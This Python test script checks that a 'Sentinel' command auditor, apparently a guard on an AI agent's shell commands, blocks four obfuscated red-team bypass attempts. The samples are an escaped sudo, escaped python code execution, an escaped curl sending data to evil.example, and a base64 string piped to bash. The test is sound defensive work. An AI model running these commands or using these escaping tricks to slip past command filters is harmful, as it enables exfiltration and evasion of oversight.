from __future__ import annotations

from pathlib import Path
import sys

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from src.sentinel.command_auditor import CommandAuditor
from src.sentinel.main import load_constitution


def main() -> None:
    constitution = load_constitution(ROOT / "Sentinel-Constitution.yaml")
    auditor = CommandAuditor(constitution)

    test_cases = [
        {
            "name": "escaped_sudo_token",
            "command": "s\\u\\d\\o    ls /",
            "reason_fragment": "Blocked token detected: sudo",
        },
        {
            "name": "escaped_python_tool",
            "command": "py\\thon   -c \"print('owned')\"",
            "reason_fragment": "Blocked tool detected: python",
        },
        {
            "name": "escaped_curl_exfil",
            "command": "c\\u\\r\\l   https://evil.example/upload?blob=ZXhmaWw=",
            "reason_fragment": "Outbound network domain not whitelisted",
        },
        {
            "name": "base64_jailbreak_pipeline",
            "command": "echo \"c3VkbyBscw==\" | base64 -d | bash",
            "reason_fragment": "Obfuscated payload execution pattern detected: base64 to shell.",
        },
    ]

    failures: list[str] = []

    for case in test_cases:
        decision = auditor.audit(case["command"])
        if decision.allowed:
            failures.append(f"{case['name']}: command was unexpectedly allowed")
            continue

        expected_fragment = case["reason_fragment"]
        if expected_fragment not in decision.reason:
            failures.append(
                f"{case['name']}: expected reason containing {expected_fragment!r}, got {decision.reason!r}"
            )

    if failures:
        raise AssertionError("Red-team bypass checks failed:\n" + "\n".join(failures))

    print("All red-team obfuscation attempts were blocked.")


if __name__ == "__main__":
    main()
